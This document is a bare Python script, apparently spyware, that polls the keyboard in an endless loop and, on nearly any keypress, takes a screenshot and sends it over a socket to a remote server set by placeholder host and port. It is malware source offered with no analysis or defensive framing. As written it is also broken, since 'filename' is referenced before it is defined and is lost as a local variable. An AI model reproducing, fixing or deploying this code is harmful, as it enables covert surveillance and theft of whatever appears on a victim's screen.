from mss import mss
import requests
import os
import socket
import keyboard

#----------------------------------------------
host = "yourserver"
port = 5001
#-----------------------------------------------

SEPARATOR = "<----->"
BUFFER_SIZE = 4096
filesize = os.path.getsize(filename)

def getpick():
    with mss() as sct:
        filename = sct.shot()

def sendimg():
    s = socket.socket()
    s.connect((host, port))
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
    s.close()

while True:
    try:
        if keyboard.is_pressed('a'):
            getpick()
            sendimg()

        if keyboard.is_pressed('b'):
            getpick()
            sendimg()

        if keyboard.is_pressed('c'):
            getpick()
            sendimg()

        if keyboard.is_pressed('d'):
            getpick()
            sendimg() 

        if keyboard.is_pressed('e'):
            getpick()
            sendimg()

        if keyboard.is_pressed('f'):
            getpick()
            sendimg()

        if keyboard.is_pressed('g'):
            getpick()
            sendimg()

        if keyboard.is_pressed('h'):
            getpick()
            sendimg()

        if keyboard.is_pressed('i'):
            getpick()
            sendimg()

        if keyboard.is_pressed('j'):
            getpick()
            sendimg()

        if keyboard.is_pressed('k'):
            getpick()
            sendimg()

        if keyboard.is_pressed('l'):
            getpick()
            sendimg()

        if keyboard.is_pressed('m'):
            getpick()
            sendimg()

        if keyboard.is_pressed('n'):
            getpick()
            sendimg()

        if keyboard.is_pressed('o'):
            getpick()
            sendimg()

        if keyboard.is_pressed('p'):
            getpick()
            sendimg()

        if keyboard.is_pressed('q'):
            getpick()
            sendimg()

        if keyboard.is_pressed('r'):
            getpick()
            sendimg()

        if keyboard.is_pressed('s'):
            getpick()
            sendimg()

        if keyboard.is_pressed('t'):
            getpick()
            sendimg()

        if keyboard.is_pressed('u'):
            getpick()
            sendimg()

        if keyboard.is_pressed('v'):
            getpick()
            sendimg()

        if keyboard.is_pressed('w'):
            getpick()
            sendimg()

        if keyboard.is_pressed('x'):
            getpick()
            sendimg()

        if keyboard.is_pressed('y'):
            getpick()
            sendimg()

        if keyboard.is_pressed('z'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift'):
            getpick()
            sendimg()

        if keyboard.is_pressed('ctrl'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+a'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+b'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+c'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+d'):
            getpick()
            sendimg() 

        if keyboard.is_pressed('shift+e'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+f'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+g'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+h'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+i'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+j'):
            getpick()
            sendimg()
        if keyboard.is_pressed('shift+k'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+l'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+m'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+n'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+o'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+p'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+q'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+r'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+s'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+t'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+u'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+v'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+w'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+x'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+y'):
            getpick()
            sendimg()

        if keyboard.is_pressed('shift+z'):
            getpick()
            sendimg()

        if keyboard.is_pressed('space'):
            getpick()
            sendimg()

        if keyboard.is_pressed('enter'):
            getpick()
            sendimg()

        if keyboard.is_pressed('A'):
            getpick()
            sendimg()

        if keyboard.is_pressed('B'):
            getpick()
            sendimg()

        if keyboard.is_pressed('C'):
            getpick()
            sendimg()

        if keyboard.is_pressed('D'):
            getpick()
            sendimg() 

        if keyboard.is_pressed('E'):
            getpick()
            sendimg()

        if keyboard.is_pressed('F'):
            getpick()
            sendimg()

        if keyboard.is_pressed('G'):
            getpick()
            sendimg()

        if keyboard.is_pressed('H'):
            getpick()
            sendimg()

        if keyboard.is_pressed('I'):
            getpick()
            sendimg()

        if keyboard.is_pressed('J'):
            getpick()
            sendimg()

        if keyboard.is_pressed('K'):
            getpick()
            sendimg()

        if keyboard.is_pressed('L'):
            getpick()
            sendimg()

        if keyboard.is_pressed('M'):
            getpick()
            sendimg()

        if keyboard.is_pressed('N'):
            getpick()
            sendimg()

        if keyboard.is_pressed('O'):
            getpick()
            sendimg()

        if keyboard.is_pressed('P'):
            getpick()
            sendimg()

        if keyboard.is_pressed('Q'):
            getpick()
            sendimg()

        if keyboard.is_pressed('R'):
            getpick()
            sendimg()

        if keyboard.is_pressed('S'):
            getpick()
            sendimg()

        if keyboard.is_pressed('T'):
            getpick()
            sendimg()

        if keyboard.is_pressed('U'):
            getpick()
            sendimg()

        if keyboard.is_pressed('V'):
            getpick()
            sendimg()

        if keyboard.is_pressed('W'):
            getpick()
            sendimg()

        if keyboard.is_pressed('X'):
            getpick()
            sendimg()

        if keyboard.is_pressed('Y'):
            getpick()
            sendimg()

        if keyboard.is_pressed('Z'):
            getpick()
            sendimg()

    except:
        break
